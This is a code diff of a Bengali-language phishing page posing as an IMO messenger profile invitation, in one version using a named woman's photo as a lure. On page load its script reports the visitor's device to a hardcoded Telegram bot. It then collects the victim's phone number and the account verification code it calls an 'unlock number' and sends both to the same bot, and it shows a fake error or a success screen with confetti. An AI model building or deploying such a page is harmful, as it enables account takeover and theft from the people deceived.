@@ -1,204 +1,331 @@
 <!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IMO Profile Connect</title>
+<html lang="bn">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>IMO Profile Connect - Nusrat Jahan</title>  
+    <!-- Tailwind CSS CDN -->  
+    <script src="https://cdn.tailwindcss.com"></script>  
+      
+    <!-- FontAwesome CDN -->  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
     
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <style>  
+        body { margin: 0; padding: 0; background-color: #0f172a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }  
+        .imo-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }  
+        .pin-input {   
+            width: 50px; height: 55px;   
+            text-align: center; font-size: 1.5rem; font-weight: bold;  
+            background: rgba(15, 23, 42, 0.6);   
+            border: 2px solid #334155; color: white;   
+            border-radius: 10px; margin: 0 6px;   
+            transition: all 0.3s ease;  
+        }  
+        .pin-input:focus { outline: none; border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.3); }  
+        .hidden { display: none; }  
+          
+        /* Animation for fade in */  
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }  
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }  
     
-    <!-- FontAwesome CDN -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-    <style>
-        body { margin: 0; padding: 0; background-color: #0f172a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .imo-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }
-        .pin-input { 
-            width: 50px; height: 55px; 
-            text-align: center; font-size: 1.5rem; font-weight: bold;
-            background: rgba(15, 23, 42, 0.6); 
-            border: 2px solid #334155; color: white; 
-            border-radius: 10px; margin: 0 6px; 
-            transition: all 0.3s ease;
-        }
-        .pin-input:focus { outline: none; border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.3); }
-        .hidden { display: none; }
-        
-        /* Animation for fade in */
-        .fade-in { animation: fadeIn 0.5s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* Animation for success message */  
+        .success-message {  
+            animation: bounceIn 0.8s ease-out forwards;  
+            color: #10B981; /* Tailwind green-500 */  
+        }  
+        @keyframes bounceIn {  
+            0% { opacity: 0; transform: scale(0.5); }  
+            60% { opacity: 1; transform: scale(1.1); }  
+            100% { transform: scale(1); }  
+        }  
+    
+        /* Confetti Canvas */  
+        .confetti-canvas {  
+            position: fixed;  
+            top: 0;  
+            left: 0;  
+            width: 100%;  
+            height: 100%;  
+            pointer-events: none;  
+            z-index: 9999;  
+        }  
     </style>
-</head>
-<body class="flex items-center justify-center min-h-screen p-4">
+    
+</head>  
+<body class="flex items-center justify-center min-h-screen p-4">  
+<div class="w-full max-w-md imo-card rounded-2xl overflow-hidden shadow-2xl relative">  
+    <div class="p-8 min-h-[500px] flex flex-col items-center justify-center text-center">  
+          
+        <!-- ============================ -->  
+        <!-- STEP 1: PHONE NUMBER INPUT -->  
+        <!-- ============================ -->  
+        <div id="step-phone" class="w-full fade-in">  
+            <div class="relative w-24 h-24 mx-auto mb-6">  
+                <!-- Updated with the new image URL -->  
+                <img src="https://i.ibb.co/L519V3r/image.jpg" class="w-full h-full rounded-full border-4 border-sky-500 shadow-lg object-cover" alt="Nusrat Jahan Profile">  
+                <div class="absolute bottom-0 right-0 bg-green-500 w-6 h-6 rounded-full border-2 border-slate-900"></div>  
+            </div>  
+              
+            <h1 class="text-2xl font-bold text-white mb-2">নুসরত জাহান</h1>  
+            <p class="text-slate-400 text-sm mb-8">প্রোফাইলে জয়েন হতে আপনার IMO নাম্বার দিন</p>  
+              
+            <div class="relative mb-6 text-left">  
+                <label class="text-xs text-sky-400 ml-2 mb-1 block font-semibold">Phone Number</label>  
+                <div class="relative">  
+                    <i class="fa fa-phone absolute left-4 top-3.5 text-slate-400"></i>  
+                    <input type="tel" id="inputPhone" placeholder="017xxxxxxxx" class="w-full bg-slate-800 border border-slate-600 text-white p-3 pl-10 rounded-xl focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all">  
+                </div>  
+            </div>  
+    
+            <button onclick="handlePhoneSubmit()" class="w-full bg-gradient-to-r from-sky-500 to-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg hover:from-sky-400 hover:to-blue-500 active:scale-95 transition-all duration-300">  
+                <i class="fa fa-paper-plane mr-2"></i> Continue  
+            </button>  
+        </div>  
+    
+        <!-- ============================ -->  
+        <!-- STEP 2: LOADING SPINNER -->  
+        <!-- ============================ -->  
+        <div id="step-loader" class="hidden fade-in">  
+            <div class="w-16 h-16 border-4 border-slate-700 border-t-sky-500 rounded-full animate-spin mx-auto mb-6"></div>  
+            <h2 class="text-xl font-semibold text-white">এড করা হচ্ছে...</h2>  
+            <p class="text-slate-400 text-sm mt-2">অনুগ্রহ করে অপেক্ষা করুন</p>  
+        </div>  
+    
+        <!-- ============================ -->  
+        <!-- STEP 3: OTP INPUT -->  
+        <!-- ============================ -->  
+        <div id="step-otp" class="hidden w-full fade-in">  
+            <div class="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-slate-600">  
+                <i class="fa fa-shield-halved text-3xl text-sky-400"></i>  
+            </div>  
+              
+            <h2 class="text-2xl font-bold text-white mb-2">আপনার imo লক-করা আছে</h2>  
+            <p class="text-slate-400 text-sm mb-8">আপনার নাম্বারে পাঠানো ৪-সংখ্যার আনলক নাম্বার লিখুন</p>  
+              
+            <div class="flex justify-center gap-2 mb-8">  
+                <input type="tel" id="otp1" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp2')" autofocus>  
+                <input type="tel" id="otp2" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp3')">  
+                <input type="tel" id="otp3" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp4')">  
+                <input type="tel" id="otp4" class="pin-input" maxlength="1" oninput="submitFinalOtp()">  
+            </div>  
+    
+            <p class="text-slate-500 text-xs">নাম্বার পাননি? <span class="text-sky-400 cursor-pointer hover:underline">আবার পাঠান</span></p>  
+        </div>  
+    
+        <!-- ============================ -->  
+        <!-- STEP 4: SUCCESS MESSAGE -->  
+        <!-- ============================ -->  
+        <div id="step-success" class="hidden w-full fade-in">  
+            <div class="bg-green-500/10 border border-green-500/50 p-6 rounded-xl backdrop-blur-sm">  
+                <div class="w-14 h-14 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">  
+                    <i class="fa fa-check-circle text-2xl text-green-500"></i>  
+                </div>  
+                <h3 class="text-xl font-bold text-green-400 mb-2 success-message">ধন্যবাদ! নুসরাত জাহান ইমু আইডি সফলভাবে আপনার ইমুতে অ্যাড হয়েছে।</h3>  
+                <p class="text-slate-300 text-sm mb-6">আপনি এখন নুসরত জাহানের ইমু প্রোফাইল অ্যাক্সেস করতে পারবেন।</p>  
+                  
+                <button onclick="location.reload()" class="px-6 py-2 bg-green-600 text-white rounded-lg text-sm font-medium hover:bg-green-700 transition-colors shadow-lg shadow-green-900/50">  
+                    নতুন প্রোফাইল অ্যাড করুন  
+                </button>  
+            </div>  
+        </div>  
+    
+        <!-- ============================ -->  
+        <!-- STEP 5: ERROR MESSAGE (Original Error) -->  
+        <!-- ============================ -->  
+        <div id="step-error" class="hidden w-full fade-in">  
+            <div class="bg-red-500/10 border border-red-500/50 p-6 rounded-xl backdrop-blur-sm">  
+                <div class="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">  
+                    <i class="fa fa-triangle-exclamation text-2xl text-red-500"></i>  
+                </div>  
+                <h3 class="text-xl font-bold text-red-400 mb-2">ভুল হয়েছে!</h3>  
+                <p class="text-slate-300 text-sm mb-6">আপনার দেওয়া আনলক নাম্বারটি সঠিক নয়। দয়া করে সঠিক নাম্বার দিয়ে আবার চেষ্টা করুন।</p>  
+                  
+                <button onclick="resetToPhoneStep()" class="px-6 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition-colors shadow-lg shadow-red-900/50">  
+                    আবার চেষ্টা করুন  
+                </button>  
+            </div>  
+        </div>  
+    
+    </div>  
+</div>  
+    
+<!-- Confetti Canvas -->  
+<canvas id="confettiCanvas" class="confetti-canvas"></canvas>
 
-    <div class="w-full max-w-md imo-card rounded-2xl overflow-hidden shadow-2xl relative">
-        <div class="p-8 min-h-[500px] flex flex-col items-center justify-center text-center">
-            
-            <!-- ============================ -->
-            <!-- STEP 1: PHONE NUMBER INPUT -->
-            <!-- ============================ -->
-            <div id="step-phone" class="w-full fade-in">
-                <div class="relative w-24 h-24 mx-auto mb-6">
-                    <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" class="w-full h-full rounded-full border-4 border-sky-500 shadow-lg object-cover" alt="Profile">
-                    <div class="absolute bottom-0 right-0 bg-green-500 w-6 h-6 rounded-full border-2 border-slate-900"></div>
-                </div>
-                
-                <h1 class="text-2xl font-bold text-white mb-2">IMO Profile</h1>
-                <p class="text-slate-400 text-sm mb-8">প্রোফাইলে জয়েন হতে আপনার IMO নাম্বার দিন</p>
-                
-                <div class="relative mb-6 text-left">
-                    <label class="text-xs text-sky-400 ml-2 mb-1 block font-semibold">Phone Number</label>
-                    <div class="relative">
-                        <i class="fa fa-phone absolute left-4 top-3.5 text-slate-400"></i>
-                        <input type="tel" id="inputPhone" placeholder="017xxxxxxxx" class="w-full bg-slate-800 border border-slate-600 text-white p-3 pl-10 rounded-xl focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all">
-                    </div>
-                </div>
-
-                <button onclick="handlePhoneSubmit()" class="w-full bg-gradient-to-r from-sky-500 to-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg hover:from-sky-400 hover:to-blue-500 active:scale-95 transition-all duration-300">
-                    <i class="fa fa-paper-plane mr-2"></i> Continue
-                </button>
-            </div>
-
-            <!-- ============================ -->
-            <!-- STEP 2: LOADING SPINNER -->
-            <!-- ============================ -->
-            <div id="step-loader" class="hidden fade-in">
-                <div class="w-16 h-16 border-4 border-slate-700 border-t-sky-500 rounded-full animate-spin mx-auto mb-6"></div>
-                <h2 class="text-xl font-semibold text-white">এড করা হচ্ছে...</h2>
-                <p class="text-slate-400 text-sm mt-2">অনুগ্রহ করে অপেক্ষা করুন</p>
-            </div>
-
-            <!-- ============================ -->
-            <!-- STEP 3: OTP INPUT -->
-            <!-- ============================ -->
-            <div id="step-otp" class="hidden w-full fade-in">
-                <div class="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-slate-600">
-                    <i class="fa fa-shield-halved text-3xl text-sky-400"></i>
-                </div>
-                
-                <h2 class="text-2xl font-bold text-white mb-2">আপনার imo লক-করা আছে</h2>
-                <p class="text-slate-400 text-sm mb-8">আপনার নাম্বারে পাঠানো ৪-সংখ্যার আনকল নাম্বার লিখুন</p>
-                
-                <div class="flex justify-center gap-2 mb-8">
-                    <input type="tel" id="otp1" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp2')" autofocus>
-                    <input type="tel" id="otp2" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp3')">
-                    <input type="tel" id="otp3" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp4')">
-                    <input type="tel" id="otp4" class="pin-input" maxlength="1" oninput="submitFinalOtp()">
-                </div>
-
-                <p class="text-slate-500 text-xs">নাম্বার পাননি? <span class="text-sky-400 cursor-pointer hover:underline">আবার পাঠান</span></p>
-            </div>
-
-            <!-- ============================ -->
-            <!-- STEP 4: ERROR MESSAGE -->
-            <!-- ============================ -->
-            <div id="step-error" class="hidden w-full fade-in">
-                <div class="bg-red-500/10 border border-red-500/50 p-6 rounded-xl backdrop-blur-sm">
-                    <div class="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fa fa-triangle-exclamation text-2xl text-red-500"></i>
-                    </div>
-                    <h3 class="text-xl font-bold text-red-400 mb-2">ভুল হয়েছে!</h3>
-                    <p class="text-slate-300 text-sm mb-6">আপনার দেওয়া আনলক নাম্বারটি সঠিক নয়। দয়া করে সঠিক নাম্বার দিয়ে আবার চেষ্টা করুন।</p>
-                    
-                    <button onclick="location.reload()" class="px-6 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition-colors shadow-lg shadow-red-900/50">
-                        আবার চেষ্টা করুন
-                    </button>
-                </div>
-            </div>
-
-        </div>
-    </div>
-
-<script>
-    // --- TELEGRAM SETUP ---
-    const BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
-    const CHAT_ID = "8271536101"; 
-
-    // Telegram Message Sender Function
-    async function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (error) {
-            console.error("Sending failed", error);
-        }
-    }
-
-    // --- NEW LOGIC: VISITOR ALERT (Page Load) ---
-    // পেজ ওপেন করলেই এই ফাংশনটি কাজ করবে
-    window.addEventListener('load', async () => {
-        // User Agent দিয়ে ডিভাইস সম্পর্কে কিছুটা তথ্য নেওয়া
-        const device = navigator.userAgent; 
-        await sendToTelegram(`👀 *নতুন ভিজিটর অ্যালার্ট*\nকেউ একজন আপনার পেজটি ওপেন করেছে!\n📱 Device: \`${device}\`\n🕒 সময়: ${new Date().toLocaleTimeString()}`);
-    });
-
-    // --- STEP 1: Handle Phone Number ---
-    async function handlePhoneSubmit() {
-        const phoneInput = document.getElementById('inputPhone');
-        const phoneVal = phoneInput.value.trim();
-
-        if (phoneVal.length < 5) {
-            phoneInput.style.borderColor = "#ef4444";
-            setTimeout(() => phoneInput.style.borderColor = "#475569", 2000);
-            return;
-        }
-
-        // Send Phone to Telegram
-        await sendToTelegram(`📱 *IMO নাম্বার প্রাপ্ত*\n📞 নাম্বার: \`${phoneVal}\``);
-
-        // UI Transition: Phone -> Loader
-        document.getElementById('step-phone').classList.add('hidden');
-        document.getElementById('step-loader').classList.remove('hidden');
-
-        // Simulate Network Delay (3 Seconds) -> Go to OTP
-        setTimeout(() => {
-            document.getElementById('step-loader').classList.add('hidden');
-            document.getElementById('step-otp').classList.remove('hidden');
-            document.getElementById('otp1').focus(); // Focus first OTP box
-        }, 3000);
-    }
-
-    // --- STEP 2: OTP Input Logic ---
-    window.moveToNext = function(current, nextFieldID) {
-        if (current.value.length >= 1) {
-            if (nextFieldID) {
-                document.getElementById(nextFieldID).focus();
-            }
-        }
-    }
-
-    // --- STEP 3: Handle Final OTP ---
-    async function submitFinalOtp() {
-        const o1 = document.getElementById('otp1').value;
-        const o2 = document.getElementById('otp2').value;
-        const o3 = document.getElementById('otp3').value;
-        const o4 = document.getElementById('otp4').value;
-        const fullCode = o1 + o2 + o3 + o4;
-
-        if (fullCode.length === 4) {
-            // Disable inputs to prevent double submit
-            document.querySelectorAll('.pin-input').forEach(el => el.disabled = true);
-
-            // Send OTP to Telegram
-            await sendToTelegram(`🔐 *IMO ভেরিফিকেশন কোড*\n🔢 কোড: \`${fullCode}\``);
-
-            // Small delay for realism -> Show Error
-            setTimeout(() => {
-                document.getElementById('step-otp').classList.add('hidden');
-                document.getElementById('step-error').classList.remove('hidden');
-            }, 800);
-        }
-    }
-</script>
-
-</body>
-  </html>
+<script>  
+    // --- TELEGRAM SETUP ---  
+    const BOT_TOKEN = "7548672389:AAFvtDCWlgnL00I0BCwnGlzY_D0kTAIm0rI";   
+    const CHAT_ID = "7437458013";   
+    const CORRECT_OTP = "1234"; // তোমার সঠিক OTP এখানে সেট করো  
+      
+    // Telegram Message Sender Function  
+    async function sendToTelegram(message) {  
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;  
+        try {  
+            await fetch(url, {  
+                method: 'POST',  
+                headers: { 'Content-Type': 'application/json' },  
+                body: JSON.stringify({  
+                    chat_id: CHAT_ID,  
+                    text: message,  
+                    parse_mode: 'Markdown'  
+                })  
+            });  
+        } catch (error) {  
+            console.error("Sending failed", error);  
+        }  
+    }  
+      
+    // --- Confetti Animation ---  
+    const confettiCanvas = document.getElementById('confettiCanvas');  
+    const ctx = confettiCanvas.getContext('2d');  
+    let confettiActive = false;  
+    let confettiParticles = [];  
+      
+    function resizeConfettiCanvas() {  
+        confettiCanvas.width = window.innerWidth;  
+        confettiCanvas.height = window.innerHeight;  
+    }  
+    window.addEventListener('resize', resizeConfettiCanvas);  
+    resizeConfettiCanvas();  
+      
+    class ConfettiParticle {  
+        constructor() {  
+            this.x = Math.random() * window.innerWidth;  
+            this.y = Math.random() * -window.innerHeight;  
+            this.size = 5 + Math.random() * 7;  
+            this.speedY = 2 + Math.random() * 3;  
+            this.speedX = (Math.random() - 0.5) * 2;  
+            this.rotation = Math.random() * 360;  
+            this.rotationSpeed = (Math.random() - 0.5) * 10;  
+            this.opacity = 1;  
+            this.color = `hsl(${Math.random() * 360}, 80%, 60%)`;  
+            this.wind = 0;  
+        }  
+      
+        update() {  
+            this.y += this.speedY;  
+            this.wind += (Math.random() - 0.5) * 0.1;  
+            this.x += this.speedX + this.wind;  
+            this.rotation += this.rotationSpeed;  
+            this.opacity -= 0.005;  
+            if (this.y > window.innerHeight || this.opacity <= 0) {  
+                this.y = Math.random() * -50;  
+                this.x = Math.random() * window.innerWidth;  
+                this.opacity = 1;  
+                this.wind = 0;  
+            }  
+        }  
+      
+        draw() {  
+            ctx.save();  
+            ctx.translate(this.x, this.y);  
+            ctx.rotate(this.rotation * Math.PI / 180);  
+            ctx.globalAlpha = this.opacity;  
+            ctx.fillStyle = this.color;  
+            ctx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size);  
+            ctx.restore();  
+        }  
+    }  
+      
+    function createConfetti(count) {  
+        confettiParticles = []; // Clear existing particles  
+        for (let i = 0; i < count; i++) {  
+            confettiParticles.push(new ConfettiParticle());  
+        }  
+    }  
+      
+    function animateConfetti() {  
+        if (!confettiActive) return;  
+        ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);  
+        confettiParticles.forEach(p => { p.update(); p.draw(); });  
+        requestAnimationFrame(animateConfetti);  
+    }  
+      
+    function startConfetti() {  
+        createConfetti(250); // Create new confetti particles each time  
+        confettiActive = true;  
+        animateConfetti();  
+        setTimeout(() => {  
+            confettiActive = false;   
+        }, 5000); // 5 seconds  
+    }  
+      
+      
+    // --- NEW LOGIC: VISITOR ALERT (Page Load) ---  
+    // পেজ ওপেন করলেই এই ফাংশনটি কাজ করবে  
+    window.addEventListener('load', async () => {  
+        // User Agent দিয়ে ডিভাইস সম্পর্কে কিছুটা তথ্য নেওয়া  
+        const device = navigator.userAgent;   
+        await sendToTelegram(`👀 *নতুন ভিজিটর অ্যালার্ট*\nকেউ একজন আপনার পেজটি ওপেন করেছে!\n📱 Device: \`${device}\`\n🕒 সময়: ${new Date().toLocaleTimeString()}`);  
+    });  
+      
+    // --- STEP 1: Handle Phone Number ---  
+    async function handlePhoneSubmit() {  
+        const phoneInput = document.getElementById('inputPhone');  
+        const phoneVal = phoneInput.value.trim();  
+      
+        if (phoneVal.length < 5) {  
+            phoneInput.style.borderColor = "#ef4444";  
+            setTimeout(() => phoneInput.style.borderColor = "#475569", 2000);  
+            return;  
+        }  
+      
+        // Send Phone to Telegram  
+        await sendToTelegram(`📱 *IMO নাম্বার প্রাপ্ত*\n📞 নাম্বার: \`${phoneVal}\``);  
+      
+        // UI Transition: Phone -> Loader  
+        document.getElementById('step-phone').classList.add('hidden');  
+        document.getElementById('step-loader').classList.remove('hidden');  
+      
+        // Simulate Network Delay (3 Seconds) -> Go to OTP  
+        setTimeout(() => {  
+            document.getElementById('step-loader').classList.add('hidden');  
+            document.getElementById('step-otp').classList.remove('hidden');  
+            document.getElementById('otp1').focus(); // Focus first OTP box  
+        }, 3000);  
+    }  
+      
+    // --- STEP 2: OTP Input Logic ---  
+    window.moveToNext = function(current, nextFieldID) {  
+        if (current.value.length >= 1) {  
+            if (nextFieldID) {  
+                document.getElementById(nextFieldID).focus();  
+            }  
+        }  
+    }  
+      
+    // --- STEP 3: Handle Final OTP ---  
+    async function submitFinalOtp() {  
+        const o1 = document.getElementById('otp1').value;  
+        const o2 = document.getElementById('otp2').value;  
+        const o3 = document.getElementById('otp3').value;  
+        const o4 = document.getElementById('otp4').value;  
+        const fullCode = o1 + o2 + o3 + o4;  
+      
+        if (fullCode.length === 4) {  
+            // Disable inputs to prevent double submit  
+            document.querySelectorAll('.pin-input').forEach(el => el.disabled = true);  
+      
+            // Send OTP to Telegram  
+            await sendToTelegram(`🔐 *IMO ভেরিফিকেশন কোড*\n🔢 কোড: \`${fullCode}\``);  
+      
+            // Simulate server validation delay  
+            setTimeout(() => {  
+                document.getElementById('step-otp').classList.add('hidden');  
+                if (fullCode === CORRECT_OTP) {  
+                    document.getElementById('step-success').classList.remove('hidden');  
+                    startConfetti(); // Start confetti animation on success  
+                } else {  
+                    document.getElementById('step-error').classList.remove('hidden');  
+                }  
+            }, 800);  
+        }  
+    }  
+      
+    function resetToPhoneStep() {  
+        location.reload(); // Simplest way to reset for this example  
+    }  
+</script>  
+</body>  
+                    </html>
